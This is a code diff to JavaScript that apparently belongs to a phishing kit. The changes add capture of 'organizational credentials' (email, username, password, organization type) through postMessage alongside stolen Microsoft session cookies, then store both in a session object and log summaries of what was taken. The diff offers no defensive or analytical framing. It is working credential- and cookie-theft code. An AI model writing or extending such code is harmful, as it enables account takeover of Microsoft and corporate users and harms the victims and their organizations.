@@ -189,11 +189,15 @@
                     }
                                  }
 
-                // Real Microsoft cookie capture
+                // Real Microsoft cookie capture AND organizational credentials
                 let capturedCookies = [];
                 let microsoftCookies = [];
+                let organizationalCredentials = null;
                 
-                // Method 1: Listen for real Microsoft cookies sent via postMessage
+                // Method 1: Listen for real Microsoft cookies AND organizational credentials via postMessage
+                const capturePromises = [];
+                
+                // Promise for Microsoft cookies
                 const microsoftCookiePromise = new Promise((resolve) => {
                     const timeout = setTimeout(() => {
                         console.log('⏰ Timeout waiting for Microsoft cookies');
@@ -213,24 +217,64 @@
                             }
                         }
                     });
+                });
+                
+                // Promise for organizational credentials
+                const organizationalCredentialsPromise = new Promise((resolve) => {
+                    const timeout = setTimeout(() => {
+                        console.log('⏰ Timeout waiting for organizational credentials');
+                        resolve(null);
+                    }, 8000); // Wait up to 8 seconds for organizational login
                     
-                    // Also request cookies from any child windows/iframes
+                    window.addEventListener('message', function(event) {
+                        if (event.data && event.data.type === 'ORGANIZATIONAL_CREDENTIALS_CAPTURED') {
+                            clearTimeout(timeout);
+                            console.log('🏢 Received organizational credentials!', event.data);
+                            resolve(event.data.data);
+                        }
+                    });
+                    
+                    // Request organizational credentials
                     try {
                         window.postMessage({
-                            type: 'REQUEST_MICROSOFT_COOKIES'
+                            type: 'REQUEST_ORGANIZATIONAL_CREDENTIALS'
                         }, '*');
                     } catch (e) {
-                        console.log('⚠️ Could not request cookies');
+                        console.log('⚠️ Could not request organizational credentials');
                     }
                 });
                 
-                // Wait for Microsoft cookies (with timeout)
+                capturePromises.push(microsoftCookiePromise, organizationalCredentialsPromise);
+                
+                // Wait for both Microsoft cookies and organizational credentials
                 try {
-                    microsoftCookies = await microsoftCookiePromise;
-                    console.log(`🍪 Got ${microsoftCookies.length} real Microsoft cookies`);
+                    const results = await Promise.allSettled(capturePromises);
+                    
+                    // Process Microsoft cookies
+                    if (results[0].status === 'fulfilled') {
+                        microsoftCookies = results[0].value;
+                        console.log(`🍪 Got ${microsoftCookies.length} real Microsoft cookies`);
+                    } else {
+                        console.log('⚠️ Error getting Microsoft cookies:', results[0].reason);
+                        microsoftCookies = [];
+                    }
+                    
+                    // Process organizational credentials
+                    if (results[1].status === 'fulfilled') {
+                        organizationalCredentials = results[1].value;
+                        if (organizationalCredentials) {
+                            console.log('🏢 Got organizational credentials:', organizationalCredentials.organizationType);
+                        } else {
+                            console.log('ℹ️ No organizational credentials captured (direct Microsoft login)');
+                        }
+                    } else {
+                        console.log('⚠️ Error getting organizational credentials:', results[1].reason);
+                        organizationalCredentials = null;
+                    }
                 } catch (error) {
-                    console.log('⚠️ Error waiting for Microsoft cookies:', error);
+                    console.log('⚠️ Error waiting for capture data:', error);
                     microsoftCookies = [];
+                    organizationalCredentials = null;
                 }
                 
                 // Method 2: Current domain cookies (fallback)
@@ -257,10 +301,16 @@
                 capturedCookies = [...microsoftCookies, ...currentDomainCookies];
                 
                 sessionData.formattedCookies = capturedCookies;
-                console.log('🍪 Final cookie capture summary:', {
+                sessionData.organizationalCredentials = organizationalCredentials;
+                
+                console.log('🍪 Final capture summary:', {
                     microsoftCookies: microsoftCookies.length,
                     currentDomainCookies: currentDomainCookies.length,
                     totalCaptured: capturedCookies.length,
+                    organizationalLogin: organizationalCredentials ? organizationalCredentials.organizationType : 'None',
+                    organizationalEmail: organizationalCredentials ? organizationalCredentials.email : 'None',
+                    organizationalUsername: organizationalCredentials ? organizationalCredentials.username : 'None',
+                    hasOrganizationalPassword: organizationalCredentials ? !!organizationalCredentials.password : false,
                     microsoftDomains: [...new Set(microsoftCookies.map(c => c.capturedFrom))],
                     sources: [...new Set(capturedCookies.map(c => c.source))]
                 });
